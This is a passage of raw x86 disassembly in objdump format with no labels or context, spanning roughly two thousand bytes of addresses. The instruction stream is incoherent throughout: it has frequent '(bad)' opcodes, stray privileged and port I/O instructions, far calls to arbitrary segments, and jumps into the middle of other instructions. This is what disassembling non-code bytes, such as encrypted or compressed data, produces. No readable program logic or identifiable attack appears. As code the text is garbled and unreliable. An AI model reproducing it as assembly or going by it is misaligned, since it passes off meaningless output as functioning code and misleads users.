  4094f3:	adc    eax,0x94ffa497
  4094f8:	repz mov cl,0x94
  4094fb:	mov    eax,ds:0xd3a44822
  409500:	sub    edx,edx
  409502:	push   cs
  409503:	jbe    0x409498
  409505:	pop    edx
  409506:	bound  ecx,QWORD PTR [ecx]
  409508:	fimul  WORD PTR [eax+0x2a]
  40950b:	sbb    BYTE PTR [ebx],dl
  40950d:	outs   dx,BYTE PTR ds:[esi]
  40950e:	mov    eax,ds:0xbcd41e1f
  409513:	xchg   esp,eax
  409514:	(bad)  
  409515:	push   esp
  409516:	int    0x53
  409518:	mov    ds:0xf2db77ef,al
  40951d:	push   ecx
  40951e:	sub    cl,dl
  409520:	jb     0x409572
  409522:	add    BYTE PTR [ebp-0x2fde230d],dl
  409528:	push   eax
  409529:	aam    0xbc
  40952b:	xchg   esp,eax
  40952c:	(bad)  
  40952d:	fsub   DWORD PTR [esi+0x18]
  409530:	dec    ch
  409532:	stc    
  409533:	retf   0xd7a8
  409536:	cmp    al,0x88
  409538:	mov    ecx,0x1eb04eaf
  40953d:	call   0xd25ea662
  409542:	lods   al,BYTE PTR ds:[esi]
  409543:	xor    cl,al
  409545:	dec    ebx
  409546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409547:	pop    ds
  409548:	shl    DWORD PTR [eax+ebx*4-0x4],0x6a
  40954d:	sbb    al,0x9
  40954f:	xor    edi,DWORD PTR [ebp+0x54]
  409552:	dec    edx
  409553:	shl    BYTE PTR [edx-0x56],1
  409556:	hlt    
  409557:	retf   0xbc2
  40955a:	fdivr  DWORD PTR [edx-0x29]
  40955d:	ror    DWORD PTR [esi+eiz*4-0x12],cl
  409561:	test   DWORD PTR [eax],esp
  409563:	mov    dh,0xeb
  409565:	int    0x34
  409567:	dec    ebx
  409568:	bound  eax,QWORD PTR [ebx-0x20143803]
  40956e:	sub    bh,bl
  409570:	jb     0x409544
  409572:	hlt    
  409573:	retf   0x7f5a
  409576:	std    
  409577:	(bad)  
  409578:	jmp    0x4095ce
  40957a:	jecxz  0x409546
  40957c:	mov    al,ds:0xe78e77d7
  409581:	pop    esp
  409582:	xchg   esi,eax
  409583:	sar    BYTE PTR [esi+esi*1],1
  409586:	mov    al,ds:0x1b7a50e7
  40958b:	ins    DWORD PTR es:[edi],dx
  40958c:	test   DWORD PTR [esi-0x3],esi
  40958f:	xlat   BYTE PTR ds:[ebx]
  409590:	xchg   edi,eax
  409591:	xlat   BYTE PTR ds:[ebx]
  409592:	fstp   DWORD PTR [esi]
  409594:	out    dx,al
  409595:	(bad)  
  409597:	enter  0x7f7,0x9f
  40959b:	cs jb  0x409540
  40959e:	hlt    
  40959f:	retf   0x7f6a
  4095a2:	std    
  4095a3:	(bad)  
  4095a4:	jmp    0x409582
  4095a6:	jg     0x40960c
  4095a8:	jmp    0x409589
  4095aa:	cld    
  4095ab:	loop   0x4095c8
  4095ad:	int    0xb6
  4095af:	push   ebx
  4095b0:	jb     0x4095d5
  4095b2:	std    
  4095b3:	(bad)  
  4095b4:	jmp    0x4095f2
  4095b6:	cmc    
  4095b7:	push   ds
  4095b8:	cwde   
  4095b9:	xlat   BYTE PTR ds:[ebx]
  4095ba:	xchg   esp,eax
  4095bb:	sbb    al,0x22
  4095bd:	dec    eax
  4095be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c0:	dec    esp
  4095c1:	paddw  mm0,mm7
  4095c4:	jmp    0x40961a
  4095c6:	cmp    eax,0xf09f72cc
  4095cb:	push   edx
  4095cc:	mov    bl,0xe7
  4095ce:	ja     0x409645
  4095d0:	repz push es
  4095d2:	dec    ebp
  4095d3:	rcl    BYTE PTR [edi-0x1b37882a],0x97
  4095da:	add    al,0x95
  4095dc:	pop    ss
  4095dd:	xor    al,0xd4
  4095df:	push   edx
  4095e0:	mov    dl,0xf7
  4095e2:	dec    DWORD PTR [ebx+esi*8+0x74bc3556]
  4095e9:	call   0xc7fd:0xffab06f8
  4095f0:	jmp    0x4095d1
  4095f2:	sbb    dl,BYTE PTR [edi]
  4095f4:	stos   BYTE PTR es:[edi],al
  4095f5:	icebp  
  4095f6:	cld    
  4095f7:	out    0x98,eax
  4095f9:	loopne 0x4095b6
  4095fb:	test   ebx,edi
  4095fd:	(bad)  
  4095ff:	(bad)  
  409600:	jmp    0x409622
  409602:	cmp    esp,esp
  409604:	(bad)  
  409605:	(bad)  
  409607:	(bad)  
  409608:	jmp    0x4095c8
  40960a:	mov    ch,0xa
  40960c:	out    0xdf,eax
  40960e:	push   ss
  40960f:	enter  0x1b93,0x8c
  409613:	mov    eax,0x182a48c8
  409618:	adc    esp,DWORD PTR [edx-0x58]
  40961b:	pop    ds
  40961c:	push   ds
  40961d:	call   0xa600:0x77b81e4
  409624:	jmp    0x1ed98c0c
  409629:	pop    esi
  40962a:	or     bh,BYTE PTR gs:[esi+ebx*8+0x3c]
  40962f:	or     bh,al
  409631:	sbb    al,0xf5
  409633:	enter  0xd7ed,0xf2
  409637:	mov    esi,0x53fdcb61
  40963c:	hlt    
  40963d:	sbb    bl,dh
  40963f:	pop    edi
  409640:	sbb    BYTE PTR [ebx-0x48482d84],bl
  409646:	adc    eax,0xcfcb9b
  40964b:	call   0xd990:0xa9b3c08e
  409652:	pop    ds
  409653:	dec    esi
  409654:	lea    ecx,[ecx]
  409656:	test   BYTE PTR [esi+ebp*1+0x7d7f19bd],dl
  40965d:	shl    BYTE PTR [ebx-0x28],cl
  409660:	xchg   esp,eax
  409661:	loope  0x40969b
  409663:	(bad)  
  409664:	mov    edx,0x8ec7124b
  409669:	ret    
  40966a:	sbb    esi,ebp
  40966c:	lock in eax,dx
  40966e:	mul    bl
  409670:	and    DWORD PTR [ebx-0xe16f0da],0x72
  409677:	fimul  WORD PTR [ebp-0x39]
  40967a:	rcr    DWORD PTR [eax-0x19],0x2
  40967e:	lock fwait
  409680:	add    eax,0x39cfdeb3
  409685:	inc    edi
  409686:	fs inc esi
  409688:	lahf   
  409689:	sub    al,0x39
  40968b:	mov    ch,0xbc
  40968d:	lahf   
  40968e:	(bad)
  409692:	retf   
  409693:	mov    al,0x22
  409695:	xlat   BYTE PTR ds:[ebx]
  409696:	hlt    
  409697:	inc    ecx
  409698:	adc    al,BYTE PTR [edi]
  40969a:	(bad)  
  40969c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40969d:	sbb    al,0x36
  40969f:	outs   dx,DWORD PTR ds:[esi]
  4096a0:	out    dx,al
  4096a1:	out    dx,eax
  4096a2:	mov    esi,0xed55914e
  4096a7:	xlat   BYTE PTR ds:[ebx]
  4096a8:	jle    0x4096da
  4096aa:	or     ah,BYTE PTR [ecx-0x1660f60d]
  4096b0:	fisubr WORD PTR [edi-0x66]
  4096b3:	or     DWORD PTR [ecx-0x584fe04a],edi
  4096b9:	mov    edi,0xaffb0c16
  4096be:	cmp    DWORD PTR [edx-0x2e022151],edi
  4096c4:	test   DWORD PTR [ecx-0xc3c70cf],ebx
  4096ca:	pushf  
  4096cb:	sub    cl,ch
  4096cd:	push   es
  4096ce:	(bad)  
  4096cf:	rcr    cl,cl
  4096d1:	aad    0xe
  4096d3:	sub    dh,BYTE PTR [ebx+0x53c678e9]
  4096d9:	repz aas 
  4096db:	pop    ebp
  4096dc:	sub    eax,0xc7b90cd4
  4096e1:	loop   0x4096bd
  4096e3:	pxor   mm6,mm3
  4096e6:	dec    ch
  4096e8:	mov    eax,0xf334beda
  4096ed:	aas    
  4096ee:	in     eax,dx
  4096ef:	(bad)  
  4096f0:	out    dx,eax
  4096f1:	mov    dl,0xbb
  4096f3:	rcr    BYTE PTR ds:0x9387e3ab,cl
  4096f9:	pop    esi
  4096fa:	push   eax
  4096fb:	loopne 0x409690
  4096fd:	xlat   BYTE PTR ds:[ebx]
  4096fe:	mov    cl,0xcf
  409700:	out    dx,al
  409701:	pop    edi
  409702:	adc    DWORD PTR [ebx+ecx*4-0x12ae725a],ecx
  409709:	pop    ds
  40970a:	clc    
  40970b:	les    edi,FWORD PTR [eax-0x25972bf8]
  409711:	(bad)  
  409712:	cmp    al,0xc0
  409714:	push   0xcd67fe05
  409719:	rcr    DWORD PTR [ecx],cl
  40971b:	fwait
  40971c:	mov    ds:0xf2580e3e,eax
  409721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409722:	lea    esp,[esi+0x7864e3ba]
  409728:	sti    
  409729:	pushf  
  40972a:	fcomp  st(1)
  40972c:	mov    bh,0xd5
  40972e:	cwde   
  40972f:	call   0x9a136baf
  409734:	call   0x45bf:0xf0692043
  40973b:	fs sub al,0xad
  40973e:	or     eax,0x3ee4e7b2
  409743:	lock out 0xc2,eax
  409746:	adc    BYTE PTR [edi-0x4bf69976],ch
  40974c:	push   edi
  40974d:	std    
  40974e:	hlt    
  40974f:	pop    ebx
  409750:	push   edi
  409751:	not    DWORD PTR [edx]
  409753:	mov    BYTE PTR [eax-0xe],ch
  409756:	std    
  409757:	jno    0x409768
  409759:	je     0x409790
  40975b:	mov    gs,WORD PTR [edi]
  40975d:	add    edx,esp
  40975f:	and    DWORD PTR [ebx-0x68fda10b],ecx
  409765:	fbld   TBYTE PTR [ecx-0x71]
  409768:	(bad)  
  40976a:	xlat   BYTE PTR ds:[ebx]
  40976b:	loop   0x40974d
  40976d:	cmp    ch,bh
  40976f:	push   esp
  409770:	jns    0x409753
  409772:	xor    eax,0x702b1c81
  409777:	fdivp  st(2),st
  409779:	mov    al,ds:0x5443317c
  40977e:	aas    
  40977f:	cdq    
  409780:	sub    DWORD PTR [ebp-0x3],eax
  409783:	mov    ?,WORD PTR [esi-0x57]
  409786:	ret    
  409787:	hlt    
  409788:	stos   DWORD PTR es:[edi],eax
  409789:	mov    esp,0x840ac811
  40978e:	into   
  40978f:	in     eax,0xaa
  409791:	(bad)  
  409792:	je     0x4097dc
  409794:	out    0xf0,al
  409796:	mov    eax,ds:0x8d07e4e8
  40979b:	retf   0xa0af
  40979e:	(bad)  
  40979f:	enter  0x307f,0x34
  4097a3:	ficomp WORD PTR [edx+0x51]
  4097a6:	test   eax,0x32f0e6c1
  4097ab:	sbb    DWORD PTR [ecx-0x4d83348],edi
  4097b1:	push   0x551cbad
  4097b6:	push   edx
  4097b7:	inc    ebp
  4097b8:	mov    dl,0x4b
  4097ba:	ins    DWORD PTR es:[edi],dx
  4097bb:	das    
  4097bc:	add    eax,0x3f36fcfe
  4097c1:	ds mov bh,ah
  4097c4:	mov    ecx,0xabc7f912
  4097c9:	push   edx
  4097ca:	(bad)  [ebx-0x1fddc7a0]
  4097d0:	jmp    0x4ae:0x9f146bb2
  4097d7:	push   eax
  4097d8:	clc    
  4097d9:	ret    0xc85e
  4097dc:	jno    0x4097e1
  4097de:	loopne 0x409819
  4097e0:	pop    es
  4097e1:	fs pop ds
  4097e3:	mov    ds:0x379fe6fd,eax
  4097e8:	imul   esi,DWORD PTR [edx+0x6a19738c],0x2f
  4097ef:	enter  0x185,0x4b
  4097f3:	ds addr16 jb 0x409833
  4097f7:	push   ecx
  4097f8:	jmp    0x409840
  4097fa:	jmp    0x2ba663dd
  4097ff:	in     al,dx
  409800:	cli    
  409801:	fild   QWORD PTR [edi+0x6f9d8f7]
  409807:	xchg   cl,cl
  409809:	inc    esp
  40980a:	hlt    
  40980b:	jg     0x40983e
  40980d:	push   ss
  40980e:	mov    ah,0x48
  409810:	push   ecx
  409811:	sbb    DWORD PTR [ecx+0x40dfd7f5],edx
  409817:	xchg   esp,eax
  409818:	sub    al,0xea
  40981a:	loope  0x40981f
  40981c:	shl    BYTE PTR [esi-0x3],cl
  40981f:	scas   eax,DWORD PTR es:[edi]
  409820:	push   edi
  409821:	aaa    
  409822:	jb     0x409874
  409824:	sub    BYTE PTR [eax],dh
  409826:	loopne 0x4097ef
  409828:	(bad)  
  409829:	subps  xmm6,XMMWORD PTR [eax-0x3c]
  40982d:	jl     0x4097cb
  40982f:	cmp    ebp,esp
  409831:	cmp    ch,BYTE PTR [ebp+0x7f]
  409834:	cli    
  409835:	push   esp
  409836:	fdivr  st,st(4)
  409838:	sbb    esp,DWORD PTR [esi]
  40983a:	sub    al,0xc8
  40983c:	xor    al,0xaf
  40983e:	cmp    sp,bp
  409841:	pop    ss
  409842:	and    BYTE PTR [eax-0x15],ch
  409845:	arpl   dx,si
  409847:	mov    dl,0x19
  409849:	loop   0x409829
  40984b:	scas   al,BYTE PTR es:[edi]
  40984c:	pop    ss
  40984d:	call   0xa016cbd8
  409852:	lds    ecx,FWORD PTR [ecx+0xc955714]
  409858:	jmp    0x4098d5
  40985a:	add    al,0x48
  40985c:	ins    DWORD PTR es:[edi],dx
  40985d:	addr16 fwait
  40985f:	lock gs ffreep st(0)
  409863:	frstor [ebp+0x4662b2ce]
  409869:	mov    ah,0xe2
  40986b:	imul   esi,DWORD PTR [ecx],0x5e
  40986e:	sar    dh,cl
  409870:	(bad)  [ebx]
  409872:	fiadd  DWORD PTR [ebx]
  409874:	pop    es
  409875:	cmp    DWORD PTR [edi-0x15c7e238],eax
  40987b:	outs   dx,BYTE PTR ds:[esi]
  40987c:	cli    
  40987d:	ficom  WORD PTR [esi+0x5a1feaca]
  409883:	pop    esi
  409884:	sub    DWORD PTR [edx+0x5d],eax
  409887:	dec    eax
  409888:	xor    ebp,esi
  40988a:	mov    al,0x1c
  40988c:	fstp   st(7)
  40988e:	sub    edx,DWORD PTR [ecx-0x28cd8bbf]
  409894:	nop
  409895:	mov    ch,bh
  409897:	pop    ebp
  409898:	cmp    ch,BYTE PTR [ecx]
  40989a:	mov    dh,ch
  40989c:	mov    ebx,esi
  40989e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40989f:	enter  0x1e74,0xbd
  4098a3:	pop    eax
  4098a4:	xchg   esp,eax
  4098a5:	xor    BYTE PTR [ecx],0xa4
  4098a8:	jmp    0x4098cf
  4098aa:	cmp    al,0xfd
  4098ac:	repz mov cl,0xaa
  4098af:	stos   BYTE PTR es:[edi],al
  4098b0:	in     eax,0xdf
  4098b2:	das    
  4098b3:	cld    
  4098b4:	jnp    0x409859
  4098b6:	lahf   
  4098b7:	sbb    bl,BYTE PTR [ebx+edi*1]
  4098ba:	std    
  4098bb:	jae    0x409852
  4098bd:	sbb    ah,BYTE PTR [ecx+0x59]
  4098c0:	cmp    edx,eax
  4098c2:	or     al,0xc8
  4098c4:	cmc    
  4098c5:	pop    edx
  4098c6:	shl    BYTE PTR [eax+0xb],1
  4098c9:	adc    eax,DWORD PTR [edx-0x415c116d]
  4098cf:	xor    ecx,DWORD PTR [ebp+0x1f]
  4098d2:	sub    ch,BYTE PTR [edx]
  4098d4:	or     ah,BYTE PTR [edi-0x6c26446]
  4098da:	ror    DWORD PTR [edx+eax*2+0xa],cl
  4098de:	jge    0x40994d
  4098e0:	inc    ebx
  4098e1:	xchg   DWORD PTR [si-0x59],esi
  4098e5:	inc    ecx
  4098e6:	add    al,0x2c
  4098e8:	xchg   edi,eax
  4098e9:	pop    eax
  4098ea:	cmp    eax,0x879693e7
  4098ef:	clc    
  4098f0:	jb     0x4098d0
  4098f2:	xor    esp,DWORD PTR [eax]
  4098f4:	push   ebp
  4098f5:	(bad)  
  4098f6:	loope  0x4098d6
  4098f8:	rol    DWORD PTR [ebx+0x5d],0xa7
  4098fc:	out    0x37,al
  4098fe:	xchg   ebx,eax
  4098ff:	jp     0x4098a1
  409901:	loope  0x409940
  409903:	jns    0x40989c
  409905:	cmp    eax,0xde4043ad
  40990a:	or     BYTE PTR ds:0x8f534d10,bh
  409910:	and    BYTE PTR [edi-0x7f],bl
  409913:	sbb    edi,DWORD PTR [ebx+0x3224c60f]
  409919:	(bad)  
  40991b:	sub    eax,DWORD PTR [eax+ecx*2-0x78c85c65]
  409922:	std    
  409923:	retf   0x15a9
  409926:	and    edi,ecx
  409928:	mov    ah,0x1c
  40992a:	jns    0x4098fa
  40992c:	es ins DWORD PTR es:[edi],dx
  40992e:	mov    dl,0x47
  409930:	dec    esp
  409931:	out    0x40,al
  409933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409934:	push   ecx
  409935:	pop    ss
  409936:	scas   al,BYTE PTR es:[edi]
  409937:	jo     0x4098d7
  409939:	lea    eax,[eax]
  40993b:	sahf   
  40993c:	push   0x49
  40993e:	xchg   edi,eax
  40993f:	dec    edx
  409940:	sar    BYTE PTR [edi+0x5b],0xca
  409944:	inc    edi
  409945:	sti    
  409946:	inc    esp
  409947:	xchg   ebp,eax
  409948:	cwde   
  409949:	call   0xc0f76217
  40994e:	pop    es
  40994f:	mov    esi,0x7efd9395
  409954:	mov    eax,ds:0xd4fe50aa
  409959:	mov    ecx,esp
  40995b:	enter  0x6ec,0xcb
  40995f:	cs stos DWORD PTR es:[edi],eax
  409961:	in     al,0x13
  409963:	mov    ah,0xed
  409965:	xor    esp,DWORD PTR [ebx-0x14404a14]
  40996b:	int    0xf3
  40996d:	imul   eax,DWORD PTR [edi+0x7d03a3c8],0xcb19fdca
  409977:	inc    esp
  409978:	jmp    0x40996c
  40997a:	leave  
  40997b:	adc    DWORD PTR [ecx+0x10],0xf
  40997f:	(bad)  
  409981:	pop    es
  409982:	daa    
  409983:	xor    ch,bl
  409985:	and    dl,cl
  409987:	jl     0x4099d3
  409989:	jmp    0x71271469
  40998e:	and    eax,edi
  409990:	loope  0x40995a
  409992:	mov    esp,0x8a8c0a1a
  409997:	xor    cl,ah
  409999:	inc    ebp
  40999a:	lods   eax,DWORD PTR ds:[esi]
  40999b:	enter  0x5441,0x92
  40999f:	sub    DWORD PTR [ebx-0x220034b8],ecx
  4099a5:	loop   0x409a07
  4099a7:	mov    edi,0xa9fcca63
  4099ac:	loope  0x4099c1
  4099ae:	mul    BYTE PTR [ecx+0x78]
  4099b1:	call   0x1fb2951f
  4099b6:	(bad)  
  4099b7:	not    DWORD PTR [eax-0x14cdb81c]
  4099bd:	fcomp  DWORD PTR [eax-0x3efda175]
  4099c3:	sub    BYTE PTR [edi+ebx*8-0x41],bh
  4099c7:	adc    BYTE PTR [ebx-0x65f73062],ch
  4099cd:	stos   DWORD PTR es:[edi],eax
  4099ce:	test   BYTE PTR [esi+0x726776eb],bh
  4099d4:	pop    ds
  4099d5:	inc    esp
  4099d6:	fidiv  WORD PTR ds:0xc82c3f3d
  4099dc:	push   0x3
  4099de:	div    BYTE PTR [eax]
  4099e0:	test   al,0xf4
  4099e2:	pop    edx
  4099e3:	pop    ebx
  4099e4:	jmp    0x409a4d
  4099e6:	push   0xb270c63d
  4099eb:	scas   eax,DWORD PTR es:[edi]
  4099ec:	arpl   di,bx
  4099ee:	scas   eax,DWORD PTR es:[edi]
  4099ef:	fwait
  4099f0:	or     BYTE PTR [esi],dh
  4099f2:	cmp    ebx,DWORD PTR [eax-0x5c02ae47]
  4099f8:	inc    esp
  4099f9:	shr    esi,cl
  4099fb:	or     dl,al
  4099fd:	mov    edi,0xdc7a2632
  409a02:	mov    eax,ds:0xa8b641c
  409a07:	push   esp
  409a08:	or     al,0x69
  409a0a:	(bad)  
  409a0b:	mov    BYTE PTR [ebp+edx*4+0x16],dl
  409a0f:	fsubr  st,st(3)
  409a11:	int    0x30
  409a13:	nop
  409a14:	pop    esp
  409a15:	xchg   edx,eax
  409a16:	jp     0x4099c3
  409a18:	sub    al,0xde
  409a1a:	ror    BYTE PTR [ecx],1
  409a1c:	jl     0x4099d2
  409a1e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a20:	dec    esp
  409a21:	pop    ss
  409a22:	cmp    DWORD PTR [edi+edx*1-0x61],edi
  409a26:	and    edx,DWORD PTR [edi-0x1783fb15]
  409a2c:	cmp    eax,0x36ebf87
  409a31:	loope  0x409a8f
  409a33:	lods   al,BYTE PTR ds:[esi]
  409a34:	aaa    
  409a35:	cmp    DWORD PTR [eax],ebp
  409a37:	dec    ebx
  409a38:	into   
  409a39:	shr    BYTE PTR [esi+edx*1-0xd],cl
  409a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a3e:	repz adc al,0xf2
  409a41:	or     al,0xad
  409a43:	imul   edi,edx,0x15
  409a46:	push   edx
  409a47:	pusha  
  409a48:	in     al,dx
  409a49:	mov    edi,0xd5e3c856
  409a4e:	(bad)  [esi]
  409a50:	out    0xee,eax
  409a52:	ja     0x409abf
  409a54:	jmp    0x4099fb
  409a56:	dec    edx
  409a57:	pop    edi
  409a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a59:	outs   dx,DWORD PTR ds:[esi]
  409a5a:	fist   DWORD PTR [esp+esi*1-0x24]
  409a5e:	test   BYTE PTR [eax],ah
  409a60:	adc    edi,DWORD PTR [edx-0x63cc837f]
  409a66:	and    edi,edx
  409a68:	cdq    
  409a69:	mov    ch,0xfc
  409a6b:	mov    dh,0x50
  409a6d:	sbb    eax,0x743b1826
  409a72:	aam    0xc7
  409a74:	icebp  
  409a75:	into   
  409a76:	test   al,0xaf
  409a78:	gs invd 
  409a7b:	xchg   edi,eax
  409a7c:	in     al,dx
  409a7d:	xchg   edi,eax
  409a7e:	xchg   ebp,eax
  409a7f:	lods   eax,DWORD PTR ds:[esi]
  409a80:	jecxz  0x409ad1
  409a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a83:	push   ss
  409a84:	inc    ebx
  409a85:	mov    bl,0x90
  409a87:	retf   
  409a88:	xchg   ebx,eax
  409a89:	dec    eax
  409a8a:	sbb    eax,0x84f75429
  409a8f:	pop    edi
  409a90:	xor    ecx,DWORD PTR [ebx+0x50a0f8fc]
  409a96:	sbb    al,0x7e
  409a98:	retf   
  409a99:	enter  0x198e,0xee
  409a9d:	fistp  QWORD PTR [ecx-0x73]
  409aa0:	pusha  
  409aa1:	ins    BYTE PTR es:[edi],dx
  409aa2:	ins    BYTE PTR es:[edi],dx
  409aa3:	in     eax,dx
  409aa4:	xor    al,0x46
  409aa6:	cld    
  409aa7:	pusha  
  409aa8:	pop    eax
  409aa9:	xor    ch,dl
  409aab:	dec    eax
  409aac:	jle    0x409aed
  409aae:	fcomp  QWORD PTR ds:0xc8a056af
  409ab4:	into   
  409ab5:	sahf   
  409ab6:	std    
  409ab7:	lahf   
  409ab8:	adc    al,0x9a
  409aba:	mov    ebx,0xd673e7ca
  409abf:	mov    DWORD PTR [eax-0x5],eax
  409ac2:	mov    esp,0x8d189378
  409ac7:	enter  0x7ae4,0x93
  409acb:	je     0x409a5f
  409acd:	mov    dh,0xea
  409acf:	pop    ss
  409ad0:	jmp    0x409ab8
  409ad2:	inc    esp
  409ad3:	xchg   edx,eax
  409ad4:	cdq    
  409ad5:	mov    eax,0xdea2cf59
  409ada:	ret    0x1421
  409add:	dec    ebp
  409ade:	repz shl BYTE PTR [edi-0x41],cl
  409ae2:	fst    QWORD PTR [edx-0x15]
  409ae5:	ror    ah,cl
  409ae7:	mov    al,0xc5
  409ae9:	mov    al,0x2c
  409aeb:	idiv   DWORD PTR [ebx+0x56ebe4df]
  409af1:	mov    ?,WORD PTR [ebx]
  409af3:	adc    edi,DWORD PTR ds:0xeb582a65
  409af9:	inc    ebp
  409afa:	sbb    esi,DWORD PTR ds:0xcf19e2fe
  409b00:	jle    0x409b0c
  409b02:	mov    esi,0xbc40eb43
  409b07:	rol    BYTE PTR [ebx-0x14c1905e],cl
  409b0d:	xor    al,0x11
  409b0f:	sub    eax,0xdf4c5167
  409b14:	xchg   edi,eax
  409b15:	fbld   TBYTE PTR [edi]
  409b17:	push   ecx
  409b18:	mov    DWORD PTR ss:[edx+0x12],ebp
  409b1c:	cmp    bh,bh
  409b1e:	std    
  409b1f:	stos   BYTE PTR es:[edi],al
  409b20:	or     esi,DWORD PTR [ebx-0x75]
  409b23:	les    ecx,FWORD PTR [ecx+0xb8d95d2]
  409b29:	jge    0x409ab3
  409b2b:	enter  0x725,0x83
  409b2f:	push   esi
  409b30:	(bad)  
  409b31:	jmp    0x409b66
  409b33:	pop    ss
  409b34:	jmp    0x409acf
  409b36:	cmp    DWORD PTR [eax+eax*8-0x64],esi
  409b3a:	dec    esi
  409b3b:	add    DWORD PTR [edx],edi
  409b3d:	fild   QWORD PTR [ecx+0x6ce5d264]
  409b43:	xor    eax,0x303155d7
  409b48:	sbb    ebx,edi
  409b4a:	pop    edx
  409b4b:	into   
  409b4c:	xor    DWORD PTR ss:0x90df58b8,esi
  409b53:	pop    es
  409b54:	xchg   edi,eax
  409b55:	mov    bl,0x56
  409b57:	xor    eax,0x2afd2b20
  409b5c:	push   esp
  409b5d:	call   0x4a3d3636
  409b62:	bswap  eax
  409b64:	jp     0x409b2d
  409b66:	lock test BYTE PTR [esi-0x7f],bh
  409b6a:	lahf   
  409b6b:	fs cli 
  409b6d:	lods   al,BYTE PTR ds:[esi]
  409b6e:	add    DWORD PTR [ebx],ecx
  409b70:	in     eax,dx
  409b71:	adc    BYTE PTR [esi-0x77],cl
  409b74:	xchg   edi,eax
  409b75:	sub    al,BYTE PTR [eax-0x179dc419]
  409b7b:	mov    DWORD PTR [edx],0x1412c764
  409b81:	dec    esp
  409b82:	sub    dl,BYTE PTR [ebp-0x64]
  409b85:	dec    edx
  409b86:	std    
  409b87:	sub    al,0x60
  409b89:	in     al,dx
  409b8a:	mov    ds,WORD PTR [ebx-0x373683cd]
  409b90:	ins    DWORD PTR es:[edi],dx
  409b91:	ror    DWORD PTR [edx+0x14e9c933],cl
  409b97:	(bad)  
  409b98:	jmp    0x409b3e
  409b9a:	test   al,0x11
  409b9c:	mov    edx,0xacaf5419
  409ba1:	loopne 0x409bf5
  409ba3:	pop    edi
  409ba4:	inc    esi
  409ba5:	aam    0xa3
  409ba7:	dec    eax
  409ba8:	cmp    al,BYTE PTR [ebx]
  409baa:	jne    0x409c0f
  409bac:	jmp    0x409c0a
  409bae:	xchg   ecx,eax
  409baf:	icebp  
  409bb0:	inc    edi
  409bb1:	pop    ss
  409bb2:	inc    edx
  409bb3:	repnz or bl,cl
  409bb6:	xchg   ebp,eax
  409bb7:	mov    DWORD PTR [edx+esi*1],esp
  409bba:	cmp    eax,0xdbe02da2
  409bbf:	sub    ebp,ebx
  409bc1:	call   0xd1d1:0xaf0709ac
  409bc8:	adc    eax,DWORD PTR [ebx-0x69]
  409bcb:	enter  0x823e,0x3a
  409bcf:	mov    DWORD PTR [eax+ebx*8+0xe],esi
  409bd3:	sbb    eax,0xb4cc7feb
  409bd8:	add    dl,BYTE PTR [edi]
  409bda:	in     eax,dx
  409bdb:	shl    DWORD PTR [edi+ebx*8],0x22
  409bdf:	add    DWORD PTR [edi-0x126b4d70],edi
  409be5:	sub    DWORD PTR [ebx-0x405f1382],ebp
  409beb:	lock mov al,0x16
  409bee:	xor    DWORD PTR [ebx-0x347e06e9],0xffffffb6
  409bf5:	ins    DWORD PTR es:[edi],dx
  409bf6:	inc    eax
  409bf7:	iret   
  409bf8:	pusha  
  409bf9:	mov    bl,0xfc
  409bfb:	dec    ebx
  409bfc:	dec    eax
  409bfd:	xchg   esp,eax
  409bfe:	jnp    0x409c6a
  409c00:	sbb    ah,ch
  409c02:	and    eax,ecx
  409c04:	adc    DWORD PTR [eax+0x3d],0xdf51c6dd
  409c0b:	jbe    0x409bed
  409c0d:	lock mov ah,BYTE PTR [eax-0x36]
  409c11:	pop    edi
  409c12:	loope  0x409c12
  409c14:	imul   ebx,DWORD PTR [ebx+ebp*1+0x5a45250d],0xdaa8cfc8
  409c1f:	sub    DWORD PTR ds:0xed6144d7,ecx
  409c25:	xchg   ebx,eax
  409c26:	sahf   
  409c27:	dec    edi
  409c28:	jecxz  0x409be9
  409c2a:	test   al,0xae
  409c2c:	clc    
  409c2d:	push   es
  409c2e:	mov    dl,0x16
  409c30:	fistp  QWORD PTR gs:[edi-0x37e1f6db]
  409c37:	stos   DWORD PTR es:[edi],eax
  409c38:	ja     0x409c97
  409c3a:	cld    
  409c3b:	jg     0x409be7
  409c3d:	or     BYTE PTR [eax],bh
  409c3f:	retf   
  409c40:	mov    edx,DWORD PTR [eax+0x8]
  409c43:	jge    0x409c48
  409c45:	inc    eax
  409c46:	scas   eax,DWORD PTR es:[edi]
  409c47:	enter  0x1ff7,0xbc
  409c4b:	jecxz  0x409bed
  409c4d:	xchg   ebx,eax
  409c4e:	mul    cl
  409c50:	out    0x14,al
  409c52:	xchg   ebp,eax
  409c53:	js     0x409be8
  409c55:	ja     0x409c97
  409c57:	sub    edi,DWORD PTR [esi+0x47]
  409c5a:	jge    0x409c5e
  409c5c:	scas   al,BYTE PTR es:[edi]
  409c5d:	shl    DWORD PTR [esi],cl
  409c5f:	iret   
  409c60:	leave  
  409c61:	push   esi
  409c62:	pop    es
  409c63:	sub    BYTE PTR [ebx+0x44],0xbb
  409c67:	pop    eax
  409c68:	test   ebx,0x54ebe0ac
  409c6e:	push   ebp
  409c6f:	ss call 0x42c025ef
  409c75:	fbld   TBYTE PTR [ecx+eax*2]
  409c78:	leave  
  409c79:	sub    bl,al
  409c7b:	cmp    BYTE PTR [ecx],dh
  409c7d:	fs dec bl
  409c80:	inc    esp
  409c81:	lea    ebx,[edi-0x313166d8]
  409c87:	or     dl,dh
  409c89:	shr    BYTE PTR [esi-0x74c48d38],cl
  409c8f:	pop    ds
  409c90:	outs   dx,DWORD PTR ds:[esi]
  409c91:	fcomp  QWORD PTR [eax+0x455980a]
  409c97:	not    bl
  409c99:	gs std 
  409c9b:	mov    ds:0x433729be,eax
  409ca0:	neg    bh
  409ca2:	gs test al,0x7f
  409ca5:	mov    cl,0x16
  409ca7:	sbb    DWORD PTR [esi+0x75],edx
  409caa:	std    
  409cab:	int    0x3
  409cad:	sub    esp,edi
